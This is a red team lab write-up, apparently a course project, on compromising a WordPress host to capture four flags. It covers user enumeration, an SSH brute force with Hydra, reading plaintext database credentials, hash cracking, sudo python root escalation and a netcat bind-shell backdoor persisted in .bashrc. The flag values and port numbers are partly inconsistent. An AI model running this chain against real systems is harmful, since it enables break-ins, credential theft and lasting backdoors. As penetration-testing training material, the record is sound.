# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation
  - Obtain Flags 1-4
  - Establish a back door

### Network Topology
![Network Topology](/Images/Final_project_top.JPG)

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sS 192.168.1.110
```
![Nmap Scan](/Images/NmapScan.png)


This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22	SSH
  - Port 80	http
  - Port 111	rpcbind
  - Port 139	netbios-ssn
  - Port 445	microsoft-ds

The following vulnerabilities were identified on target 1:
- Target 1
  - CWE-200: Exposure of Sensitive Information to an Unauthorized Actor 
    - The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information.
    - Allowed for port scan and identification of vulnerable ports.
  - CWE-672: Operation on a Resource after Expiration or Release
    - The software uses, accesses, or otherwise operates on a resource after that resource has been expired, released, or revoked.
    - Wordpress version 4.8.7 was vulnerable to user enumeration among other vulnerabilities, and allowed for discovery of users of target 1.
  - CWE-521: Weak Password Requirements 
    - The product does not require a strong passwords, which makes it easier for attackers to compromise user accounts.
    - Allows a brute force attack to crack or guess the weak password of an user: Michael, and use the stole credentials to infiltrate the server.
  - CWE-307: Improper Restriction of Excessive Authentication Attempts 
    - The software does not implement sufficient measures to prevent multiple failed authentication attempts within in a short time frame, making it more susceptible to brute force attacks.
    - Allows a brute force attack to occur.
  - CWE-256: Unprotected Storage of Credentials
    - Storing a password in plaintext may result in a system compromise.
    - MySQL password was stored in plain text, and used to access MySQL database.
  - CWE-522: Insufficiently Protected Credentials
    - The product transmits or stores authentication credentials, but it uses an insecure method that is susceptible to unauthorized interception and/or retrieval.
    - MySQL contained user passwords hashes that was cracked by John.
  - CWE-863: Incorrect Authorization Reverse shell vulnerability 
    - The software does not correctly perform an authorization check, which  allows attackers to bypass intended access restrictions.
    - Steven, with permission of execute python exe, was used to escalate privileges to root.

![SSHVuln](/Images/SSHVuln.png)

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: b9bbcb33ellb80be759c4e844862482d
    - **Exploit Used**
      - WPScan to enumerate users
        - `wpscan --url 192.168.1.110/wordpress/ --enumerate u`
        - ![WPScan](/Images/WPScan.png)
      - Use Hydra to crack michael's password or guess password
        - `hydra -l michael -P /usr/shar/wordlists/rockyou.txt 192.168.1.110 ssh`
        - ![Hydra](/Images/Hydra.PNG)
      - Use stolen credentials to SSH into michael's account
        - `ssh michael@192.168.1.110`
        - `Password: michael`
      - Search for Flag1
        - `grep -rnw ./ -e 'flag1' 2>/dev/null`
        - ![flag1](/Images/Flag1.PNG)

  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
    - **Exploit Used**
      - Search for Flag2 in /var/www
      - `cd /var/www`
      - `grep -rnw ./ -e 'flag2' 2>/dev/null`
      - ![flag2](/Images/Flag2.PNG)

  - `flag3.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
    - **Exploit Used**
      - Find plain text password my MySQL database
        - `grep -rnw ./ -e 'password' 2>/dev/null`
        - `nano /var/www/html/wordpress/wp-config.php`
        - ![PlaintextPW](/Images/PlaintextPW.PNG)
      - Access and search MySQL database for usernames and passwords
        - `mysql -u root -p'R@3nSecurity'`
        - ![My1](/Images/Mysql1.png)
        - ![My2](/Images/Mysql2.png)
        - `select post_content from wp_posts`
        - ![My3](/Images/Mysql3.png)

  - `flag4.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
    - **Exploit Used**
      - Find user hashed password
        - ![hash](/Images/HashPW.png)
      - Crack user hashed password with Jack the Ripper
        - Create a .txt file with the usernames and hash passwords
          - ![hashtxt](/Images/HashPWtext.png)
        - `john hash_pw.txt`
          - ![Cracked](/Images/Cracked.PNG)
      - Log in as Steven with cracked password
        - ![SSHSteven](/Images/SSHSteven.png)
      - Escalate to root
        - ![UserPrivilages](/Images/UserPrivilages.png)
        - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
      - Search for flag4
        - `find . -name flag4.txt`
        - ![flag4](/Images/flag4.png)
  - Backdooring the Target
    - **Exploit Used**
      - Backdoor installed: (Bind Shell) Netcat
      - Set up a listener on Target 1 by:
        - Gain root access to Target 1 and executing:
          - `nc -lvnp 444 - /bin/bash`
          - Save a .sh file of the command in .bashrc
        - Connect it to Kali by: 
          - `nc 192.168.1.110 4444`
        - ![Backdoor](/Images/Backdoor.png)



